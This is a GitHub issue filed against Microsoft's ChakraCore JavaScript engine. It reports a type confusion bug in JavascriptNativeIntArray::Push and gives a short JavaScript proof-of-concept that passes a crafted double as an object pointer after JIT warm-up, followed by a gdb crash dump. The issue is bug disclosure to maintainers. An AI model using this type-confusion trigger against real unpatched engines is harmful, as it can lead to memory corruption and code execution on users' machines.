### ISSUE TITLE
SegmentFault due to a type confusion bug in JavascriptNativeIntArray::Push

### ISSUE THREAD

**Issue by syjzwjj** [microsoft/ChakraCore#6320]
```js

function opt1() {
}

function opt(obj) {
    Array.prototype.push.call(obj, 1);
    opt1(' ' + obj);
}

var arr = new Array([0]);
for (let i = 0; i < 0x100; i++) {
    opt(arr[0]);
}
opt(2.3023e-320);
```

backtrace is 

```
[----------------------------------registers-----------------------------------]
RAX: 0xbe1c000000000000 
RBX: 0x555556135350 --> 0x7ffff49e4188 --> 0x7ffff3d35b70 (<_ZN2Js16RecyclableObject8FinalizeEb>:	ret)
RCX: 0xbe1c000000400000 
RDX: 0x21 ('!')
RSI: 0xbe1c000000400000 
RDI: 0x555556135300 --> 0x7ffff49d19d0 --> 0x7ffff401a300 (<_ZNK2Js13ScriptContext11GetNullAddrEv>:	mov    rax,QWORD PTR [rdi+0x8])
RBP: 0x7fffffffcc10 --> 0x7fffffffcce0 --> 0x7fffffffcd10 --> 0x7fffffffcdb0 --> 0x7fffffffce20 --> 0x7fffffffcee0 (--> ...)
RSP: 0x7fffffffcbf0 --> 0x7ff7f1e21000 (movabs rax,0x55555610ad88)
RIP: 0x7ffff4249b77 (<_ZN2Js24JavascriptNativeIntArray4PushEPNS_13ScriptContextEPvi+39>:	mov    rcx,QWORD PTR [rsi])
R8 : 0x7fffffffd0d8 --> 0x7ffff7ee6020 --> 0x7ffff4a273c0 --> 0x7ffff3d35b70 (<_ZN2Js16RecyclableObject8FinalizeEb>:	ret)
R9 : 0x7fffff80b000 
R10: 0x20 (' ')
R11: 0x7ff7f1e21000 (movabs rax,0x55555610ad88)
R12: 0x7ff7e8000ac0 --> 0x7ffff7e8f380 --> 0x800000001b 
R13: 0x7ffff7f2e850 --> 0x1 
R14: 0x1000000000000 
R15: 0x7ffff7ed2d80 --> 0x7ffff4a1e160 --> 0x7ffff3d35b70 (<_ZN2Js16RecyclableObject8FinalizeEb>:	ret)
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff4249b6f <_ZN2Js24JavascriptNativeIntArray4PushEPNS_13ScriptContextEPvi+31>:	and    rax,rsi
   0x7ffff4249b72 <_ZN2Js24JavascriptNativeIntArray4PushEPNS_13ScriptContextEPvi+34>:	cmp    rax,r14
   0x7ffff4249b75 <_ZN2Js24JavascriptNativeIntArray4PushEPNS_13ScriptContextEPvi+37>:	
    je     0x7ffff4249ba4 <_ZN2Js24JavascriptNativeIntArray4PushEPNS_13ScriptContextEPvi+84>
=> 0x7ffff4249b77 <_ZN2Js24JavascriptNativeIntArray4PushEPNS_13ScriptContextEPvi+39>:	mov    rcx,QWORD PTR [rsi]
   0x7ffff4249b7a <_ZN2Js24JavascriptNativeIntArray4PushEPNS_13ScriptContextEPvi+42>:	
    lea    rbx,[rip+0x841e0f]        # 0x7ffff4a8b990 <_ZN16VirtualTableInfoIN2Js24JavascriptNativeIntArrayEE7AddressE>
   0x7ffff4249b81 <_ZN2Js24JavascriptNativeIntArray4PushEPNS_13ScriptContextEPvi+49>:	cmp    rcx,QWORD PTR [rbx]
   0x7ffff4249b84 <_ZN2Js24JavascriptNativeIntArray4PushEPNS_13ScriptContextEPvi+52>:	
    jne    0x7ffff4249ba4 <_ZN2Js24JavascriptNativeIntArray4PushEPNS_13ScriptContextEPvi+84>
   0x7ffff4249b86 <_ZN2Js24JavascriptNativeIntArray4PushEPNS_13ScriptContextEPvi+54>:	mov    ebx,DWORD PTR [rsi+0x20]
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffcbf0 --> 0x7ff7f1e21000 (movabs rax,0x55555610ad88)
0008| 0x7fffffffcbf8 --> 0x7ffff7e8a180 --> 0x7ffff49d0c80 --> 0x7ffff4008400 (<_ZN2Js14EntryPointInfo8FinalizeEb>:	push   rbp)
0016| 0x7fffffffcc00 --> 0x555556135350 --> 0x7ffff49e4188 --> 0x7ffff3d35b70 (<_ZN2Js16RecyclableObject8FinalizeEb>:	ret)
0024| 0x7fffffffcc08 --> 0x7ffff7ee4000 --> 0x7ffff49e3150 --> 0x7ffff3d35b70 (<_ZN2Js16RecyclableObject8FinalizeEb>:	ret)
0032| 0x7fffffffcc10 --> 0x7fffffffcce0 --> 0x7fffffffcd10 --> 0x7fffffffcdb0 --> 0x7fffffffce20 --> 0x7fffffffcee0 (--> ...)
0040| 0x7fffffffcc18 --> 0x7ff7f1e21382 (mov    rax,QWORD PTR [rbp-0x18])
0048| 0x7fffffffcc20 --> 0x7ffff7ee4000 --> 0x7ffff49e3150 --> 0x7ffff3d35b70 (<_ZN2Js16RecyclableObject8FinalizeEb>:	ret)
0056| 0x7fffffffcc28 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00007ffff4249b77 in Js::JavascriptNativeIntArray::Push(Js::ScriptContext*, void*, int) ()
   from /home/zwjj/ChakraCore/out/Release/libChakraCore.so
```

Build on ubuntu 16.04 x86_64, latest git branch.
